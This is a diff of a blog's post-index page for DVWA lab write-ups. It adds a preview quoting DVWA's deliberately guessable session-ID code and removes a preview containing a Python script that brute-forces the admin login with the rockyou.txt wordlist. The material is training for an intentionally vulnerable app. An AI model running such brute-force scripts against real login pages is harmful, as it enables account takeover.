@@ -159,6 +159,26 @@
 
 <article class="post-entry"> 
 <figure class="entry-cover">
+        <img loading="lazy" src="http://localhost:1313/images/posts/dvwa-cover.png" alt="DVWA Weak Session IDs">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">DVWA Weak Session IDs Low/Medium/High Security
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Description Vulnerability: Weak Session IDs
+Impact: Session IDs may be guessed to gain access as other accounts.
+LOW Security Level This level has really simple code:
+&lt;?php $html = &#34;&#34;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#34;POST&#34;) { if (!isset ($_SESSION[&#39;last_session_id&#39;])) { $_SESSION[&#39;last_session_id&#39;] = 0; } $_SESSION[&#39;last_session_id&#39;]&#43;&#43;; $cookie_value = $_SESSION[&#39;last_session_id&#39;]; setcookie(&#34;dvwaSession&#34;, $cookie_value); } ?&gt; The dvwaSession cookie will simply increases 1 when we click the Generate button.
+MEDIUM Security Level This MEDIUM Security Level is also simple it take time() value which is the current Unix timestamp and set that to dvwaSession cookie value:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-10-20 19:52:18 +0700 +07'>October 20, 2025</span>&nbsp;·&nbsp;1 min</footer>
+  <a class="entry-link" aria-label="post link to DVWA Weak Session IDs Low/Medium/High Security" href="http://localhost:1313/posts/dvwa-weak-session-ids-low-medium-high-security/"></a>
+</article>
+
+<article class="post-entry"> 
+<figure class="entry-cover">
         <img loading="lazy" src="http://localhost:1313/images/posts/dvwa-cover.png" alt="DVWA SQL Injection">
 </figure>
   <header class="entry-header">
@@ -322,24 +342,6 @@ PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data. 64 bytes from 1.1.1.1: icmp_seq=1 t
   <footer class="entry-footer"><span title='2025-10-16 14:40:01 +0700 +07'>October 16, 2025</span>&nbsp;·&nbsp;2 min</footer>
   <a class="entry-link" aria-label="post link to DVWA Command Injection Low/Medium/High Security" href="http://localhost:1313/posts/dvwa-command-injection-low-medium-high-security/"></a>
 </article>
-
-<article class="post-entry"> 
-<figure class="entry-cover">
-        <img loading="lazy" src="http://localhost:1313/images/posts/dvwa-brute-force.jpg" alt="DVWA Brute Force">
-</figure>
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">DVWA Brute Force Low/Medium/High Security
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Description Vulnerability: Brute-force Impact: Brute-force and get the admin account credentials. LOW Security Level This is the simple code I created to brute-force the admin account using rockyou.txt password lists.
-Change PHPSESSID to your own one.
-import requests baseUrl = &#34;http://localhost/DVWA/vulnerabilities/brute/?Login=Login&amp;username=admin&#34; cookies = { &#34;PHPSESSID&#34;: &#34;91fdcd96e5376633ef607edd0a1b8093&#34;, &#34;security&#34;: &#34;low&#34; } try: with open(&#39;/usr/share/wordlists/rockyou.txt&#39;) as file: for line in file: password = line.rstrip() url = baseUrl &#43; f&#34;&amp;password={password}&#34; try: print(f&#34;Attempting: password={password}&#34;) res = requests.get(url, cookies=cookies) if &#34;Username and/or password incorrect.&#34; not in res.text: print() print(&#34;=&gt; Password found: &#34;, password) exit() except requests.exceptions.RequestException as e: print(&#34;Request error:&#34;, e) continue except FileNotFoundError as e: print(&#34;File not found:&#34;, e) MEDIUM Security Level The only difference between LOW and MEDIUM level is in the Login failed if logic:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-10-16 14:35:21 +0700 +07'>October 16, 2025</span>&nbsp;·&nbsp;2 min</footer>
-  <a class="entry-link" aria-label="post link to DVWA Brute Force Low/Medium/High Security" href="http://localhost:1313/posts/dvwa-brute-force-low-medium-high-security/"></a>
-</article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="next" href="http://localhost:1313/posts/page/2/">Next&nbsp;&nbsp;»
@@ -357,6 +359,8 @@ import requests baseUrl = &#34;http://localhost/DVWA/vulnerabilities/brute/?Logi
         <h2>Recently Added</h2>
 
         
+        <div><a href="http://localhost:1313/posts/dvwa-weak-session-ids-low-medium-high-security/">DVWA Weak Session IDs Low/Medium/High Security</a></div>
+        
         <div><a href="http://localhost:1313/posts/dvwa-sql-injection-low-medium-high-security/">DVWA SQL Injection Low/Medium/High Security</a></div>
         
         <div><a href="http://localhost:1313/posts/dvwa-sql-injection-blind-low-medium-high-security/">DVWA SQL Injection Blind Low/Medium/High Security</a></div>
@@ -364,8 +368,6 @@ import requests baseUrl = &#34;http://localhost/DVWA/vulnerabilities/brute/?Logi
         <div><a href="http://localhost:1313/posts/dvwa-open-http-redirect-low-medium-high-security/">DVWA Open HTTP Redirect Low/Medium/High Security</a></div>
         
         <div><a href="http://localhost:1313/posts/dvwa-javascript-attacks-low-medium-high-security/">DVWA Javascript Attacks Low/Medium/High Security</a></div>
-        
-        <div><a href="http://localhost:1313/posts/dvwa-file-upload-low-medium-high-security/">DVWA File Upload Low/Medium/High Security</a></div>
         
     </section>
 
@@ -389,7 +391,7 @@ import requests baseUrl = &#34;http://localhost/DVWA/vulnerabilities/brute/?Logi
 
         <a class="sidebar-tag" href="http://localhost:1313/tags/dvwa/">
             DVWA
-            <span>(12)</span>
+            <span>(13)</span>
         </a>
 
         
